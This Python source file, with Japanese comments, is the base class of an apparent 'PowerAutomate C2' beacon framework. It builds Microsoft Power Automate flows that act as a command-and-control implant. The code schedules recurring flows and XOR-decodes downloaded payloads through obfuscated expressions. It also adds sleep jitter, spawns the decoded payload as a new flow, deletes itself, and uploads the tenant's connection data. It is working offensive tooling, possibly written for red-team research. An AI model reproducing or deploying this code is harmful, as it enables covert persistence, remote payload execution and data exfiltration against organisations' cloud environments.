import os
import random
from typing import List, Tuple

from pypowerautomate.flow import *
from pypowerautomate.triggers import *
from pypowerautomate.actions import *
from pypowerautomate.connections import Connections


def create_bitmap_array(n: int = 8):
    eval_str = "@createArray("
    for i in range(2**n):
        tmp = "createArray("
        for j in range(n):
            tmp += str(i >> (n-j-1) & 1)
            tmp += ","
        tmp = tmp[:-1] + ")"
        eval_str += tmp + ","
    eval_str = eval_str[:-1] + ")"
    return eval_str


class BaseBeacon:
    """
    PowerAutomate C2のBeaconを作成するための抽象化クラス
    PowerAutomate C2のC2通信を作成する際はこのクラスを継承して作成する。
    Beacon用のFlowを作成するには、PowerAutomate Management Connectorが必須であるため、
    そのUUIDをClient IDとしてとして利用する。

    - Pa-Client-Id:   PowerAutomate C2 Serverがホスト情報を管理するために使用.
                    PowerAutomate Management ConnectorのIDに含まれうUUIDを利用する.

    e.g.) flowmanagement_id=shared-flowmanagemen-282bc0cf-2475-4655-8262-a6938ff6b179
    """

    def __init__(self, flowmanagement_id: str, client_id: str, is_encoded: bool = True, key: str = None, key_length: int = 16, is_init: bool = False, sleep_time:int = 60, jitter: int = 10, has_approval:bool = True, email:str = None) -> None:
        self.flowmanagement_id: str = flowmanagement_id
        self.client_id = client_id
        self.is_encoded = is_encoded
        self.key_length = key_length
        self.sleep_time = sleep_time
        self.jitter = jitter
        if is_encoded:
            self.set_xor_key(key)
        else:
            self.xor_key = None
        self.is_init = is_init
        self.has_approval = has_approval
        self.email = email
        self.root_node: BaseAction = None
        self.connections_data: dict = {}
        self.connections: Connections = self.update_connections()

    def get_xor_key(self):
        return self.xor_key

    def set_xor_key(self, key=None):
        """
        xor_keyを設定する。xor_keyの設定の優先順位は以下の通り
            1. 引数による指定
            2. ./{client_id}_secret_key.txtの内容
            3. ランダム生成
        """
        def read_secret(filename):
            return open(filename, "r").read() if os.path.exists(filename) else ""

        def write_secret(filename, key):
            open(filename, "w").write(key)

        if key:
            self.xor_key = key
            write_secret(f"{self.client_id}_secret_key.txt", self.xor_key)
        else:
            # xor_keyが事前に定義されていない場合
            self.xor_key = read_secret(f"{self.client_id}_secret_key.txt")
            if not self.xor_key:
                self.xor_key = self.gen_random_xor_key()
                write_secret(f"{self.client_id}_secret_key.txt", self.xor_key)

    def gen_random_xor_key(self, key_len=16):
        return ",".join([str(random.randint(0, 255)) for _ in range(key_len)])

    def update_xor_key(self):
        self.xor_key = self.gen_random_xor_key()

    def update_connections(self):
        """
        CreateFlowに必要なConnection情報を設定する
        必須となるコネクタに応じて、methodをOverrideすること。
        """
        connections = Connections()
        count = 0
        if self.connections_data:
            count = connections.set_connections_from_dict(self.connections_data)
        if count < 1:
            # Flow Management Connectorを設定する
            connections.add_connection(self.flowmanagement_id, "/providers/Microsoft.PowerApps/apis/shared_flowmanagement")
        self.connections = connections

    def set_connections_data(self, data: dict):
        # validate input data
        if "value" in data:
            for e in data["value"]:
                if "id" in e:
                    if "shared_flowmanagement" in e["id"]:
                        self.connections_data = data
                        return

    def generate_xor_actions(self) -> Tuple[Actions, Actions]:
        if not self.xor_key:
            self.set_xor_key()
        xor_table_init_actions = Actions(is_root=True)
        xor_table_init_actions += InitVariableAction("InitPayloadStr2", "payload2", "array")
        xor_table_init_actions += InitVariableAction("bit_array", "bit_array", "array", create_bitmap_array(8))
        xor_table_init_actions += InitVariableAction("chr_array", "chr_array", "array", "@createArray('*','*','*','*','*','*','*','*','*','\t','','\x0b','\x0c','','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','','!','\"','#','$','%','&','''','(',')','*','+',',','-','.','/','0','1','2','3','4','5','6','7','8','9',':',';','<','=','>','?','@','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','[','\\',']','^','_','`','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','{','|','}','~','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*')")
        xor_table_init_actions += InitVariableAction("K", "K", "array", f"@createArray({self.xor_key})")

        xor_decode_actions = Actions()
        xor_decode_actions += SetVariableAction("convert payload to array", "payload2", "@split(variables('payload'),',')")
        xor_decode_actions += SelectAction("xor", "@range(0,length(variables('payload2')))", "@variables('chr_array')[div(sub(indexOf(concat(variables('bit_array')),concat(createArray(int(not(or(and(bool(variables('bit_array')[variables('K')[mod(item(),16)]][0]),bool(variables('bit_array')[int(variables('payload2')[item()])][0])),and(not(bool(variables('bit_array')[variables('K')[mod(item(),16)]][0])),not(bool(variables('bit_array')[int(variables('payload2')[item()])][0])))))),int(not(or(and(bool(variables('bit_array')[variables('K')[mod(item(),16)]][1]),bool(variables('bit_array')[int(variables('payload2')[item()])][1])),and(not(bool(variables('bit_array')[variables('K')[mod(item(),16)]][1])),not(bool(variables('bit_array')[int(variables('payload2')[item()])][1])))))),int(not(or(and(bool(variables('bit_array')[variables('K')[mod(item(),16)]][2]),bool(variables('bit_array')[int(variables('payload2')[item()])][2])),and(not(bool(variables('bit_array')[variables('K')[mod(item(),16)]][2])),not(bool(variables('bit_array')[int(variables('payload2')[item()])][2])))))),int(not(or(and(bool(variables('bit_array')[variables('K')[mod(item(),16)]][3]),bool(variables('bit_array')[int(variables('payload2')[item()])][3])),and(not(bool(variables('bit_array')[variables('K')[mod(item(),16)]][3])),not(bool(variables('bit_array')[int(variables('payload2')[item()])][3])))))),int(not(or(and(bool(variables('bit_array')[variables('K')[mod(item(),16)]][4]),bool(variables('bit_array')[int(variables('payload2')[item()])][4])),and(not(bool(variables('bit_array')[variables('K')[mod(item(),16)]][4])),not(bool(variables('bit_array')[int(variables('payload2')[item()])][4])))))),int(not(or(and(bool(variables('bit_array')[variables('K')[mod(item(),16)]][5]),bool(variables('bit_array')[int(variables('payload2')[item()])][5])),and(not(bool(variables('bit_array')[variables('K')[mod(item(),16)]][5])),not(bool(variables('bit_array')[int(variables('payload2')[item()])][5])))))),int(not(or(and(bool(variables('bit_array')[variables('K')[mod(item(),16)]][6]),bool(variables('bit_array')[int(variables('payload2')[item()])][6])),and(not(bool(variables('bit_array')[variables('K')[mod(item(),16)]][6])),not(bool(variables('bit_array')[int(variables('payload2')[item()])][6])))))),int(not(or(and(bool(variables('bit_array')[variables('K')[mod(item(),16)]][7]),bool(variables('bit_array')[int(variables('payload2')[item()])][7])),and(not(bool(variables('bit_array')[variables('K')[mod(item(),16)]][7])),not(bool(variables('bit_array')[int(variables('payload2')[item()])][7]))))))))),1),18)]")
        xor_decode_actions += SetVariableAction("convert payload to string", "payload", "@join(body('xor'),'')")

        return xor_table_init_actions, xor_decode_actions

    def create_approval_actions(self,approve_actions: Actions,reject_actions:Actions) -> Actions:
        actions = Actions()
        actions += StartAndWaitForAnApprovalAction("WaitApproval", self.email)
        if_action = IfStatement("CheckApproval", Condition('"@body(\'WaitApproval\')?[\'outcome\']" == "Approve"'))
        if_action.set_true_actions(approve_actions)
        if_action.set_false_actions(reject_actions)
        actions += if_action
        return actions

    def create_new_flow_actions(self, payload_varname: str = "payload") -> Actions:

        actions = Actions()
        actions += WaitAction("wait1", self.sleep_time + random.randint(-self.jitter, self.jitter), "Second")
        create_flow = CreateFlowAction("CreateFlow")
        create_flow.set_parameters("@utcNow()", payload_varname, self.connections)
        actions += create_flow
        actions += WaitAction("wait2", self.sleep_time + random.randint(-self.jitter, self.jitter), "Second")
        return actions

    def upload_connections_actions(self) -> Actions:
        """
        継承先で実装する
        """
        NotImplementedError("Expect to be overridden by inherited classes")

    def download_payload_actions(self) -> Actions:
        """
        継承先で実装する
        Flow内の"payload"という変数に次のフローとなるjsonを設定するアクションを作成する
        """
        NotImplementedError("Expect to be overridden by inherited classes")

    def generate_flow(self):
        """
        Beacon Payloadを作成する
        """
        flow = Flow()
        self.update_connections()

        # Flowの開始処理となるTriggerを設定
        trigger = RecurrenceTrigger("reccurence")
        trigger.set_schedule("Day", 1)
        flow.set_trigger(trigger)

        flow.append_action(InitVariableAction("InitPayloadStr", "payload", "string"))

        # 次のペイロードを取得するActionsを生成して、Scopeにまとめる
        load_next_beacon_actions = Actions()
        if self.is_encoded:
            xor_table_init_actions, xor_decode_actions = self.generate_xor_actions()
            flow.root_actions += xor_table_init_actions
        load_next_beacon_actions += self.download_payload_actions()
        if self.is_encoded:
            load_next_beacon_actions += xor_decode_actions
        load_next_beacon_actions += self.create_new_flow_actions()
        
        # # 承認フローの判定
        if not self.is_init and self.has_approval:
            actions = self.create_approval_actions(load_next_beacon_actions, Actions())
        else:
            actions = load_next_beacon_actions

        flow.append_action(ScopeStatement("payload_scope", actions))

        # スコープの最後に自身を削除するフローを追加する
        flow.append_action(DeleteFlowAction("DeleteFlow01"), force_exec=True)

        # コネクタ一覧を取得しUploadするActionsを生成して、Scopeにまとめる
        flow.add_top_action(ScopeStatement("connections", self.upload_connections_actions()))

        return flow
